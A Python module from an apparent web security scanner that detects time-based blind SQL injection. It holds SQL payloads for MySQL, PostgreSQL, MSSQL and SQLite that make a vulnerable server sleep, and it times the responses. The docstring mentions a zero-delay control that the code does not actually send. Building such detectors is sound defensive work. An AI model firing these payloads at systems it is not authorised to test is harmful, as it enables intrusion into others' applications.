"""Time-based blind SQL injection detector.

Idea: inject a DBMS-specific "sleep" so a successful injection makes the server
respond noticeably slower. We first measure a baseline round-trip, then send
payloads that request an N-second delay. If the response time jumps by close to
N seconds (and a zero-delay control does not), the parameter is very likely
injectable.

Time-based tests are inherently noisy, so we require the observed delay to be a
strong fraction of the requested delay and confirm with a second observation.
"""

from __future__ import annotations

from ..http_client import HttpClient
from ..target import Target
from .base import Detector, Finding, Severity

_DELAY = 5  # seconds to request in the sleep payload

# (label, template) — {d} is replaced with the delay in seconds.
_PAYLOADS = [
    ("mysql", "' AND SLEEP({d})-- -"),
    ("mysql-numeric", " AND SLEEP({d})"),
    ("postgres", "' AND (SELECT {d} FROM PG_SLEEP({d}))-- -"),
    ("mssql", "'; WAITFOR DELAY '0:0:{d}'-- -"),
    ("sqlite", "' AND {d}=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({big}))))-- -"),
]


class TimeBlindDetector(Detector):
    name = "time-blind"

    async def _elapsed(self, client: HttpClient, target: Target, param: str, value: str) -> float:
        params = target.mutate(param, value)
        if target.is_get():
            resp = await client.request(
                target.method, target.url, params=params, cookies=target.cookies
            )
        else:
            resp = await client.request(
                target.method, target.url, data=params, cookies=target.cookies
            )
        return resp.elapsed

    async def test_parameter(
        self, client: HttpClient, target: Target, param: str
    ) -> list[Finding]:
        base_value = target.params.get(param, "")

        # Baseline: median-ish of two normal requests to smooth out jitter.
        b1 = await self._elapsed(client, target, param, base_value)
        b2 = await self._elapsed(client, target, param, base_value)
        baseline = min(b1, b2)

        for label, template in _PAYLOADS:
            payload = template.format(d=_DELAY, big=_DELAY * 2_000_000)
            delayed = await self._elapsed(client, target, param, base_value + payload)

            # Require most of the requested delay to show up, above baseline.
            if delayed - baseline >= _DELAY * 0.7:
                # Confirm to reject one-off network hiccups.
                confirm = await self._elapsed(client, target, param, base_value + payload)
                if confirm - baseline >= _DELAY * 0.7:
                    confidence = min(1.0, (delayed - baseline) / _DELAY)
                    return [
                        Finding(
                            technique=self.name,
                            parameter=param,
                            severity=Severity.CRITICAL,
                            payload=base_value + payload,
                            evidence=(
                                f"{label}: baseline {baseline:.2f}s vs delayed "
                                f"{delayed:.2f}s / {confirm:.2f}s for a requested "
                                f"{_DELAY}s sleep."
                            ),
                            confidence=confidence,
                        )
                    ]

        return []
